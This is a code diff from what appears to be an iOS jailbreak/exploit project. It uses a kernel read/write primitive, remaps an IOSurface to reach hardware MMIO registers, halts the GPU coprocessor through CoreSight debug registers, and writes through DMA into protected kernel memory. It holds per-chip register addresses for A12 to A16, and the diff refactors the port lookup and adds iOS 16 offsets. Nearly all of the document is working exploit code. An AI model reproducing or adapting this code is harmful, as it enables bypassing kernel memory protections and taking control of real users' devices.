@@ -11,12 +11,16 @@
 #include <pthread/pthread.h>
 #include <IOSurface/IOSurfaceRef.h>
 #include <Foundation/Foundation.h>
-#include "GPU_CoreSight.h"
 #include "libkfd.h"
-#include "kfd_meow-Swift.h"
+#include "libmeow.h"
+#include "libkfd/perf.h"
+#include "libkfd/info/static_types/miscellaneous_types.h"
+
+#include "GPU_CoreSight.h"
 
 #define DBGWRAP_DBGHALT          (1ULL << 31)
 #define DBGWRAP_DBGACK           (1ULL << 28)
+
 signed long long base_pac_mask = 0xffffff8000000000;
 
 uint32_t sbox[] = {
@@ -63,6 +67,13 @@ uint64_t kread64_ptr_kfd(uint64_t kaddr) {
     return ptr;
 }
 
+//Thanks @jmpews
+uint64_t kread64_smr_kfd(uint64_t where) {
+    uint64_t value = kread64_kfd(where) | 0xffffff8000000000;
+    if((value & 0x400000000000) != 0)
+        value &= 0xFFFFFFFFFFFFFFE0;
+    return value;
+}
 
 uint32_t read_dword(uint64_t buffer) {
      return *(uint32_t *)buffer;
@@ -80,7 +91,6 @@ void write_qword(uint64_t addr, uint64_t value) {
      *(uint64_t *)addr= value;
 }
 
-
 // Calculate ecc function based on the provided sbox and buffer
 uint32_t calculate_ecc(const uint8_t* buffer) {
      uint32_t acc = 0;
@@ -96,50 +106,45 @@ uint32_t calculate_ecc(const uint8_t* buffer) {
      return acc;
 }
 
-
 void dma_ctrl_1(uint64_t ctrl) {
-     
-     
-     uint64_t value = read_qword(ctrl);
-     printf("dma_ctrl_1 old value: %llx\n", value);
-     write_qword(ctrl, value | 0x8000000000000001);
-     sleep(1);
-     printf("dma_ctrl_1  new value: %llx\n", *(uint64_t *)ctrl);
-     while ((~read_qword(ctrl) & 0x8000000000000001) != 0) {
-          sleep(1);
-     }
+    uint64_t value = read_qword(ctrl);
+    printf("dma_ctrl_1 old value: %llx\n", value);
+    write_qword(ctrl, value | 0x8000000000000001);
+    sleep(1);
+    printf("dma_ctrl_1  new value: %llx\n", *(uint64_t *)ctrl);
+    while ((~read_qword(ctrl) & 0x8000000000000001) != 0) {
+        sleep(1);
+    }
 }
 
 void dma_ctrl_2(uint64_t ctrl,int flag) {
-     uint64_t value = read_qword(ctrl);
-     printf("dma_ctrl_2 old value: %llx\n", value);
-     if (flag) {
-          if ((value & 0x1000000000000000) == 0) {
-               value = value | 0x1000000000000000;
-               write_qword(ctrl, value);
-               printf("dma_ctrl_2  new value: %llx\n", *(uint64_t *)ctrl);
-          }
-     } else {
-          if ((value & 0x1000000000000000) != 0) {
-               value = value & ~0x1000000000000000;
-               write_qword(ctrl, value);
-               printf("dma_ctrl_2  new value: %llx\n", *(uint64_t *)ctrl);
-          }
-     }
+    uint64_t value = read_qword(ctrl);
+    printf("dma_ctrl_2 old value: %llx\n", value);
+    if (flag) {
+        if ((value & 0x1000000000000000) == 0) {
+            value = value | 0x1000000000000000;
+            write_qword(ctrl, value);
+            printf("dma_ctrl_2  new value: %llx\n", *(uint64_t *)ctrl);
+        }
+    } else {
+        if ((value & 0x1000000000000000) != 0) {
+            value = value & ~0x1000000000000000;
+            write_qword(ctrl, value);
+            printf("dma_ctrl_2  new value: %llx\n", *(uint64_t *)ctrl);
+        }
+    }
 }
 
 void dma_ctrl_3(uint64_t ctrl,uint64_t value) {
-     value = value | 0x8000000000000000;
-     uint64_t ctrl_value =read_qword(ctrl);
-     printf("dma_ctrl_3 old value: %llx\n", ctrl_value);
-     write_qword(ctrl, ctrl_value & value);
-     printf("dma_ctrl_3  new value: %llx\n", *(uint64_t *)ctrl);
-     while ((read_qword(ctrl) & 0x8000000000000001) != 0) {
-          sleep(1);
-     }
+    value = value | 0x8000000000000000;
+    uint64_t ctrl_value =read_qword(ctrl);
+    printf("dma_ctrl_3 old value: %llx\n", ctrl_value);
+    write_qword(ctrl, ctrl_value & value);
+    printf("dma_ctrl_3  new value: %llx\n", *(uint64_t *)ctrl);
+    while ((read_qword(ctrl) & 0x8000000000000001) != 0) {
+        sleep(1);
+    }
 }
-
-
 
 void dma_init(uint64_t base6140008, uint64_t base6140108, uint64_t original_value_0x206140108) {
      dma_ctrl_1(base6140108);
@@ -153,69 +158,66 @@ void dma_done(uint64_t base6140008, uint64_t base6140108, uint64_t original_valu
      dma_ctrl_3(base6140108,original_value_0x206140108);
 }
 
-
-
 void ml_dbgwrap_halt_cpu(uint64_t coresight_base_utt) {
-     uint64_t dbgWrapReg = read_qword(coresight_base_utt);
-     printf("ml_dbgwrap_halt_cpu old value: %llx\n", dbgWrapReg);
-     if ((dbgWrapReg & 0x90000000) != 0) return;
-     write_qword(coresight_base_utt, dbgWrapReg | DBGWRAP_DBGHALT);// Clear all other writable bits besides dbgHalt; none of the power-down or reset bits must be set.
-     printf("ml_dbgwrap_halt_cpu  new value: %llx\n", *(uint64_t *)coresight_base_utt);
-     while (1) {
-          if ((read_qword(coresight_base_utt) & DBGWRAP_DBGACK) != 0) {
-               break;
-          }
-     }
+    uint64_t dbgWrapReg = read_qword(coresight_base_utt);
+    printf("ml_dbgwrap_halt_cpu old value: %llx\n", dbgWrapReg);
+    if ((dbgWrapReg & 0x90000000) != 0) return;
+    write_qword(coresight_base_utt, dbgWrapReg | DBGWRAP_DBGHALT);// Clear all other writable bits besides dbgHalt; none of the power-down or reset bits must be set.
+    printf("ml_dbgwrap_halt_cpu  new value: %llx\n", *(uint64_t *)coresight_base_utt);
+    while (1) {
+        usleep(50000);
+        if ((read_qword(coresight_base_utt) & DBGWRAP_DBGACK) != 0) {
+            printf("%llx\n", read_qword(coresight_base_utt) & DBGWRAP_DBGACK);
+            break;
+        }
+    }
 }
 
 void ml_dbgwrap_unhalt_cpu(uint64_t coresight_base_utt) {
-     uint64_t dbgWrapReg = read_qword(coresight_base_utt);
-     printf("ml_dbgwrap_unhalt_cpu curr value: %llx\n", dbgWrapReg);
-     dbgWrapReg = (dbgWrapReg & 0xFFFFFFFF2FFFFFFF) | 0x40000000;
-     write_qword(coresight_base_utt, dbgWrapReg);
-     printf("ml_dbgwrap_unhalt_cpu  back value: %llx\n", *(uint64_t *)coresight_base_utt);
-     while (1) {
-          if ((read_qword(coresight_base_utt) & DBGWRAP_DBGACK) == 0) {
-               break;
-          }
-     }
+    uint64_t dbgWrapReg = read_qword(coresight_base_utt);
+    printf("ml_dbgwrap_unhalt_cpu curr value: %llx\n", dbgWrapReg);
+    dbgWrapReg = (dbgWrapReg & 0xFFFFFFFF2FFFFFFF) | 0x40000000;
+    write_qword(coresight_base_utt, dbgWrapReg);
+    printf("ml_dbgwrap_unhalt_cpu  back value: %llx\n", *(uint64_t *)coresight_base_utt);
+    while (1) {
+        usleep(50000);
+        if ((read_qword(coresight_base_utt) & DBGWRAP_DBGACK) == 0) {
+            printf("%llx\n", read_qword(coresight_base_utt) & DBGWRAP_DBGACK);
+            break;
+        }
+    }
 }
 
 mach_port_t IO_GetSurfacePort(uint64_t magic)
 {
-     IOSurfaceRef surfaceRef = IOSurfaceCreate((__bridge CFDictionaryRef)@{
-          (__bridge NSString *)kIOSurfaceWidth : @120,
-          (__bridge NSString *)kIOSurfaceHeight : @120,
-          (__bridge NSString *)kIOSurfaceBytesPerElement : @4,
-     });
-     mach_port_t port = IOSurfaceCreateMachPort(surfaceRef);
-     *((uint64_t *)IOSurfaceGetBaseAddress(surfaceRef)) = magic;
-     IOSurfaceDecrementUseCount(surfaceRef);
-     CFRelease(surfaceRef);
-     return port;
+    IOSurfaceRef surfaceRef = IOSurfaceCreate((__bridge CFDictionaryRef)@{
+        (__bridge NSString *)kIOSurfaceWidth : @120,
+        (__bridge NSString *)kIOSurfaceHeight : @120,
+        (__bridge NSString *)kIOSurfaceBytesPerElement : @4,
+    });
+    mach_port_t port = IOSurfaceCreateMachPort(surfaceRef);
+    *((uint64_t *)IOSurfaceGetBaseAddress(surfaceRef)) = magic;
+    IOSurfaceDecrementUseCount(surfaceRef);
+    CFRelease(surfaceRef);
+    return port;
 }
 
-uint64_t FindPortAddress(mach_port_t port) {
-    objcbridge *obj = [[objcbridge alloc] init];
-    uint64_t off_task_itk_space = [obj find_ITK_SPACE];
-    
-    uint64_t itk_space_pac = kread64_kfd(get_current_task() + off_task_itk_space);
+uint64_t ipc_entry_lookup(mach_port_name_t port_name) {
+    uint64_t pr_task = get_current_task();
+    uint64_t itk_space_pac = kread64_kfd(pr_task + off_task_itk_space);
     uint64_t itk_space = itk_space_pac | 0xffffff8000000000;
+    uint32_t port_index = MACH_PORT_INDEX(port_name);
     
-    uint64_t is_table = kread64_kfd(itk_space + 0x20) | 0xffffff8000000000;
-    if((is_table & 0x400000000000) != 0)
-        is_table &= 0xFFFFFFFFFFFFFFE0;
-    printf("[i] is_table: 0x%llx\n", is_table);
-    
-    uint64_t entry = is_table + port * 0x18/*SIZE(ipc_entry)*/;
-    printf("[i] entry: 0x%llx\n", entry);
-    
-    uint64_t object_pac = kread64_kfd(entry + 0x0);
+    uint64_t is_table = kread64_smr_kfd(itk_space + off_ipc_space_is_table);
+    uint64_t entry = is_table + port_index * 0x18/*SIZE(ipc_entry)*/;
+    uint64_t object_pac = kread64_kfd(entry + off_ipc_entry_ie_object);
     uint64_t object = object_pac | 0xffffff8000000000;
+    printf("object: 0x%llx\n", object);
     
-    uint64_t kobject_pac = kread64_kfd(object + 0x48);
+    uint64_t kobject_pac = kread64_kfd(object + off_ipc_port_ip_kobject);
     uint64_t kobject = kobject_pac | 0xffffff8000000000;
-    printf("[i] ip_kobject: 0x%llx\n", kobject);
+    printf("ip_kobject: 0x%llx\n", kobject);
+    
     return kobject;
 }
 
@@ -223,11 +225,10 @@ uint64_t FindPortAddress(mach_port_t port) {
 uint64_t IO_GetMMAP(uint64_t phys, uint64_t size)
 {
     mach_port_t surfaceMachPort = IO_GetSurfacePort(1337);
-    uint64_t surface_port_addr = FindPortAddress(surfaceMachPort);
-    uint64_t kobject =kread64_ptr_kfd(surface_port_addr + 0x48);
-    uint64_t surface = kread64_ptr_kfd(kobject + 0x18);
-    uint64_t desc = kread64_ptr_kfd(surface + 0x38);
-    uint64_t ranges = kread64_ptr_kfd(desc + 0x60);
+    uint64_t kobject = ipc_entry_lookup(surfaceMachPort);
+    uint64_t surface = kread64_kfd(kobject + 0x18);
+    uint64_t desc = kread64_kfd(surface + 0x38);
+    uint64_t ranges = kread64_kfd(desc + 0x60);
     kwrite64_kfd(ranges, phys);
     kwrite64_kfd(ranges+8, size);
     kwrite64_kfd(desc + 0x50, size);
@@ -243,9 +244,10 @@ uint64_t IO_GetMMAP(uint64_t phys, uint64_t size)
 }
 
 //form 37c3
-void write_data_with_mmio(uint64_t ttbr0_va_kaddr, uint64_t ttbr1_va_kaddr, uint64_t kernel_p, uint64_t base6150000, uint64_t mask, uint64_t i, uint64_t pass) {
+void write_data_with_mmio(uint64_t kernel_p, uint64_t base6150000, uint64_t mask, uint64_t i, uint64_t pass) {
     uint64_t phys_addr = vtophys_kfd(kernel_p);
     printf("kernel_addr phys_addr: %llx %llx\n", kernel_p, phys_addr);
+    if(!phys_addr) return;
     uint64_t base6150040 = base6150000 + 0x40;
     uint64_t base6150048 = base6150000 + 0x48;
     uint64_t old_p = 0x2000000 | (phys_addr & 0x3FF0); //获取物理地址高位
@@ -267,109 +269,119 @@ void write_data_with_mmio(uint64_t ttbr0_va_kaddr, uint64_t ttbr1_va_kaddr, uint
     write_qword(base6150048, value);
 }
 
+void write_32bit_data_with_mmio(uint64_t ttbr0_va_kaddr, uint64_t ttbr1_va_kaddr, uint64_t kernel_p, uint64_t base6150000, uint64_t mask, uint64_t i, uint32_t pass) {
+    uint32_t _buf[2] = {};
+    _buf[0] = pass;
+    _buf[1] = kread32_kfd(kernel_p+4);
+    write_data_with_mmio(kernel_p, base6150000, mask, i, (uint64_t)&_buf);
+}
 
-void  pplwrite_test(void)
-{
-    uint64_t pmap= get_current_pmap();
-    uint64_t ttbr0_va_kaddr =kread64_kfd(pmap + 0);
-    uint64_t pmap1= get_kernel_pmap();
-    uint64_t ttbr1_va_kaddr =kread64_kfd(pmap1 + 0);
+void pplwrite_test(void) {
+    uint64_t pmap = get_current_pmap();
+    uint64_t ttbr0_va_kaddr = get_kernel_ttbr0va();
+    if(ttbr0_va_kaddr == 0)
+        ttbr0_va_kaddr = kread64_kfd(get_current_pmap() + off_pmap_tte);
+    uint64_t ttbr1_va_kaddr = get_kernel_ttbr1va();
+    if(ttbr1_va_kaddr == 0)
+        ttbr1_va_kaddr = kread64_kfd(get_kernel_pmap() + off_pmap_tte);
     
     dispatch_queue_t queue = dispatch_queue_create("com.example.my_queue", DISPATCH_QUEUE_SERIAL);
     dispatch_queue_set_specific(queue, CFRunLoopGetMain(), CFRunLoopGetMain(), NULL);
     dispatch_async(queue, ^{
-         uint32_t cpufamily;
-         size_t len = sizeof(cpufamily);
-         if (sysctlbyname("hw.cpufamily", &cpufamily, &len, NULL, 0) == -1) {
-              perror("sysctl");
-         } else {
-              printf("CPU Family: %x\n", cpufamily);
-         }
-         
-         uint64_t i = 0, mask=0, base=0;
-         uint32_t command = 0;
-         bool isa15a16=false;
-         switch (cpufamily) {
-              case 0x8765EDEA:   // CPUFAMILY_ARM_EVEREST_SAWTOOTH (A16)
-                   base = 0x23B700408;
-                   command = 0x1F0023FF;
-                   i = 8;
-                   mask = 0x7FFFFFF;
-                 isa15a16=true;
-                   break;
-              case 0xDA33D83D:   // CPUFAMILY_ARM_AVALANCHE_BLIZZARD (A15)
-                   base = 0x23B7003C8;
-                   command = 0x1F0023FF;
-                   i = 8;
-                   mask = 0x3FFFFF;
-                   isa15a16=true;
-                   break;
-              case 0x1B588BB3:   // CPUFAMILY_ARM_FIRESTORM_ICESTORM (A14)
-                   base = 0x23B7003D0;
-                   command = 0x1F0023FF;
-                   i = 0x28;
-                   mask = 0x3FFFFF;
-                   break;
-              case 0x462504D2:   // CPUFAMILY_ARM_LIGHTNING_THUNDER (A13)
-                   base = 0x23B080390;
-                   command = 0x1F0003FF;
-                   i = 0x28;
-                   mask = 0x3FFFFF;
-                   break;
-              case 0x07D34B9F:   // CPUFAMILY_ARM_VORTEX_TEMPEST (A12)
-                   base = 0x23B080388;
-                   command = 0x1F0003FF;
-                   i = 0x28;
-                   mask = 0x3FFFFF;
-                   break;
-              default:
-                 printf("Unsupported CPU family %x\n", cpufamily);
-                   return;
-         }
-         printf("base: %llx\n", base);
-         uint64_t  base23b7003c8 = IO_GetMMAP(base,0x8);
-         printf("base23b7003c8: %llx\n", base23b7003c8);
-         printf("*base23b7003c8: %x\n", * (uint32_t *)base23b7003c8);
-         
-         uint64_t  base6040000= IO_GetMMAP(0x206040000,0x100);  //GPU 协处理器的 CoreSight MMIO 调试寄存器块
-         printf("base6040000: %llx\n", base6040000);
-         uint64_t  base6140000= IO_GetMMAP(0x206140000,0x200);
-         printf("base6140000: %llx\n", base6140000);
-         uint64_t  base6150000= IO_GetMMAP(0x206150000,0x100);
-         printf("base6150000: %llx\n", base6150000);
-         uint64_t base6140008= base6140000+0x8; // 控制启用/禁用和运行漏洞利用所使用的硬件功能
-         printf("base6140008: %llx\n", base6140008);
-         uint64_t base6140108= base6140000+0x108; // 控制启用/禁用和运行漏洞利用所使用的硬件功能
-         printf("base6140108: %llx\n", base6140108);
-         
-         uint64_t   original_value_0x206140108= *(uint64_t *)base6140108;
-         printf("original_value_0x206140108: %llx\n", original_value_0x206140108);
-         
-         if ((~read_dword(base23b7003c8) & 0xF) != 0){
-              write_dword(base23b7003c8, command);
-              printf("*base23b7003c8: %x\n", * (uint32_t *)base23b7003c8);
-              while (1) {
-                   if ((~read_dword(base23b7003c8) & 0xF) == 0) {
-                        break;
-                   }
-              }
-         }
-         uint64_t base6150020= base6150000+0x20;
-         uint64_t base6150020_back = read_qword(base6150020);
-         if (isa15a16) write_qword(base6150020,1); // a15 a16需要
-         ml_dbgwrap_halt_cpu(base6040000);
-         dma_init(base6140008,base6140108,original_value_0x206140108);
-
-         uint64_t test_p=pmap+0x70; //test write
+        uint32_t cpufamily;
+        size_t len = sizeof(cpufamily);
+        if (sysctlbyname("hw.cpufamily", &cpufamily, &len, NULL, 0) == -1) {
+            perror("sysctl");
+        } else {
+            printf("CPU Family: %x\n", cpufamily);
+        }
         
-         write_data_with_mmio(ttbr0_va_kaddr,ttbr1_va_kaddr, test_p,base6150000,mask,i,0x4141414141414141);
-         
-         dma_done(base6140008,base6140108,original_value_0x206140108);
-         ml_dbgwrap_unhalt_cpu(base6040000);
+        uint64_t i = 0, mask=0, base=0;
+        uint32_t command = 0;
+        bool isa15a16=false;
+        switch (cpufamily) {
+            case 0x8765EDEA:   // CPUFAMILY_ARM_EVEREST_SAWTOOTH (A16)
+                base = 0x23B700408;
+                command = 0x1F0023FF;
+                i = 8;
+                mask = 0x7FFFFFF;
+                isa15a16=true;
+                break;
+            case 0xDA33D83D:   // CPUFAMILY_ARM_AVALANCHE_BLIZZARD (A15)
+                base = 0x23B7003C8;
+                command = 0x1F0023FF;
+                i = 8;
+                mask = 0x3FFFFF;
+                isa15a16=true;
+                break;
+            case 0x1B588BB3:   // CPUFAMILY_ARM_FIRESTORM_ICESTORM (A14)
+                base = 0x23B7003D0;
+                command = 0x1F0023FF;
+                i = 0x28;
+                mask = 0x3FFFFF;
+                break;
+            case 0x462504D2:   // CPUFAMILY_ARM_LIGHTNING_THUNDER (A13)
+                base = 0x23B080390;
+                command = 0x1F0003FF;
+                i = 0x28;
+                mask = 0x3FFFFF;
+                break;
+            case 0x07D34B9F:   // CPUFAMILY_ARM_VORTEX_TEMPEST (A12)
+                base = 0x23B080388;
+                command = 0x1F0003FF;
+                i = 0x28;
+                mask = 0x3FFFFF;
+                break;
+            default:
+                printf("Unsupported CPU family %x\n", cpufamily);
+                return;
+        }
+        printf("base: %llx\n", base);
+        uint64_t  base23b7003c8  = IO_GetMMAP(base,0x8);
+        printf("base23b7003c8: %llx\n", base23b7003c8);
+        printf("*base23b7003c8: %x\n", * (uint32_t *)base23b7003c8);
+        uint64_t  base6040000 = IO_GetMMAP(0x206040000, 0x100);  //GPU 协处理器的 CoreSight MMIO 调试寄存器块
+        printf("base6040000: %llx\n", base6040000);
+        uint64_t  base6140000 = IO_GetMMAP(0x206140000, 0x200);
+        printf("base6140000: %llx\n", base6140000);
+        uint64_t  base6150000 = IO_GetMMAP(0x206150000, 0x100);
+        printf("base6150000: %llx\n", base6150000);
+        uint64_t base6140008  = base6140000 + 0x8; // 控制启用/禁用和运行漏洞利用所使用的硬件功能
+        printf("base6140008: %llx\n", base6140008);
+        uint64_t base6140108  = base6140000 + 0x108; // 控制启用/禁用和运行漏洞利用所使用的硬件功能
+        printf("base6140108: %llx\n", base6140108);
         
-         if (isa15a16) write_qword(base6150020,base6150020_back);
-         uint64_t test= kread64_kfd(test_p);
-         printf("%llx  : %llx\n", test_p,test );
+        uint64_t   original_value_0x206140108 = *(uint64_t *)base6140108;
+        printf("original_value_0x206140108: %llx\n", original_value_0x206140108);
+        
+        if ((~read_dword(base23b7003c8) & 0xF) != 0){
+            write_dword(base23b7003c8, command);
+            printf("*base23b7003c8: %x\n", * (uint32_t *)base23b7003c8);
+            while (1) {
+                if ((~read_dword(base23b7003c8) & 0xF) == 0) {
+                    break;
+                }
+            }
+        }
+        uint64_t base6150020 = base6150000 + 0x20;
+        uint64_t base6150020_back = read_qword(base6150020);
+        if (isa15a16) write_qword(base6150020,1); // a15 a16需要
+        ml_dbgwrap_halt_cpu(base6040000);
+        dma_init(base6140008, base6140108, original_value_0x206140108);
+        
+        uint64_t value = 0x68;
+        if(@available(iOS 16.0, *))
+            value = 0x50;
+        
+        uint64_t test_p = pmap + value;
+        write_data_with_mmio(test_p, base6150000, mask, i, 0x4141414141414141);
+        
+        sleep(2);
+        dma_done(base6140008, base6140108, original_value_0x206140108);
+        ml_dbgwrap_unhalt_cpu(base6040000);
+        
+        if (isa15a16) write_qword(base6150020, base6150020_back);
+        uint64_t test= kread64_kfd(test_p);
+        printf("%llx  : %llx\n", test_p, test);
     });
-    
 }
